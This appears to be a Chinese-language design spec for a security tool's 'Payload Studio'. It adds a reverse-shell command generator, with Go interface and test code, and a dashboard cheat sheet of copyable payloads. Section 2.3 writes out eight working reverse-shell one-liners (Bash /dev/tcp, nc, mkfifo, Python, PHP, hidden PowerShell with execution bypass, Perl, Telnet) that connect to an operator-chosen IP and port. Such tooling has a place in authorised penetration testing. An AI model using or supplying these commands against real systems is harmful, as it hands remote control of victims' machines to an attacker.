# Phase 17 Spec D: Payload Studio 增强

> 反弹 Shell 命令生成器 + Command Center Payload 速查表
> 对应 ROADMAP 2.4 智能增强版

## 1. 概述

两个独立部分：

- **反弹 Shell 生成器**：后端 `internal/payload/shellgen.go` 根据 IP:Port 生成 8 种反弹 Shell 命令，前端 Payload Studio 新增模板分类
- **Payload 速查表**：Command Center 仪表盘上的可折叠面板，按分类展示常用 Payload，一键复制

## 2. 反弹 Shell 命令生成器

### 2.1 包结构

```
internal/payload/
  shellgen.go       # 生成器入口
  shellgen_test.go  # 测试
```

### 2.2 接口

```go
package payload

// ShellCmd 表示一种反弹 Shell 命令
type ShellCmd struct {
    Name    string `json:"name"`    // 如 "Bash", "NC", "Python"
    Command string `json:"command"` // 生成的实际命令
}

// GenerateShell 根据 IP 和 Port 生成所有支持的反弹 Shell 命令
func GenerateShell(ip string, port string) []ShellCmd
```

### 2.3 支持的 8 种命令

| Name | Command 格式 |
|------|------------|
| Bash | `bash -c 'exec bash -i &>/dev/tcp/{ip}/{port} <&1'` |
| NC | `nc -e /bin/sh {ip} {port}` |
| NC (no -e) | `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc {ip} {port} >/tmp/f` |
| Python | `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'` |
| PHP | `php -r '$s=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'` |
| Powershell | `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535\|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 \| Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"` |
| Perl | `perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` |
| Telnet | `rm -f /tmp/p; mknod /tmp/p p && telnet {ip} {port} 0</tmp/p \| /bin/sh -i 2>&1 | tee /tmp/p` |

### 2.4 Payload Studio 集成

在 `internal/models/payload.go` 的 `PayloadTemplates` 中新增模板：

```go
"reverse-shell-bash": "bash -c 'exec bash -i &>/dev/tcp/{ip}/{port} <&1'"
```

在 `PayloadTemplateMetadata` 中新增：

```go
"reverse-shell-bash": {
    Name: "Reverse Shell (Bash)",
    Description: "Bash TCP reverse shell",
    Category: "shell",
    Risk: "high",
},
```

在 Payload Studio 前端新增 "Reverse Shell" 分类，展示时动态生成完整的 8 种命令列表（非模板渲染，而是调用 API 或前端计算）。

### 2.5 前端组件

`frontend-next/src/features/payload/shell-generator.tsx`：
- IP 输入框（默认自动填充服务器的公网 IP）
- Port 输入框（默认 4444）
- 生成按钮
- 生成后展示命令列表，每条带 [复制] 按钮
- 使用 `react-hot-toast` 或 `navigator.clipboard` 复制提示

### 2.6 测试

```go
func TestGenerateShell(t *testing.T) {
    cmds := GenerateShell("10.0.0.1", "4444")
    if len(cmds) != 8 {
        t.Errorf("expected 8 commands, got %d", len(cmds))
    }
    // Verify each command contains the IP and port
    for _, cmd := range cmds {
        if !strings.Contains(cmd.Command, "10.0.0.1") {
            t.Errorf("%s: missing IP", cmd.Name)
        }
        if !strings.Contains(cmd.Command, "4444") {
            t.Errorf("%s: missing port", cmd.Name)
        }
    }
}
```

## 3. Payload 速查表

### 3.1 前端组件

`frontend-next/src/features/dashboard/payload-cheatsheet.tsx`：

- Command Center 仪表盘上的可折叠卡片
- 按分类折叠（SSRF / XXE & Injection / RCE / Client-side / Other）
- 每条 Payload 显示名称 + 模板内容 + [复制] 按钮
- 数据源：从现有 PayloadTemplates 元数据中读取，前端硬编码常用模板列表

数据结构：

```typescript
interface CheatSheetItem {
  id: string
  name: string
  template: string
  category: string
  risk: string
}
```

### 3.2 集成点

在 `frontend-next/src/app/dashboard/page.tsx` 中引入 `<PayloadCheatSheet />`，放在仪表盘内容下方或侧边。

### 3.3 交互

- 默认收起（减少视觉噪音）
- 点击分类标题展开该分类
- 点击 [复制] 将模板内容复制到剪贴板，显示 "Copied!" 反馈
- 模板中的 `{token}`、`{domain}` 等变量保留原样（用户复制后手动替换）

## 4. 交付物

**反弹 Shell：**
- `internal/payload/shellgen.go` — 生成器
- `internal/payload/shellgen_test.go` — 测试
- `internal/models/payload.go` — 新增模板 + metadata（可选）
- `frontend-next/src/features/payload/shell-generator.tsx` — 前端组件

**Payload 速查表：**
- `frontend-next/src/features/dashboard/payload-cheatsheet.tsx` — 速查表组件
- `frontend-next/src/app/dashboard/page.tsx` — 集成速查表
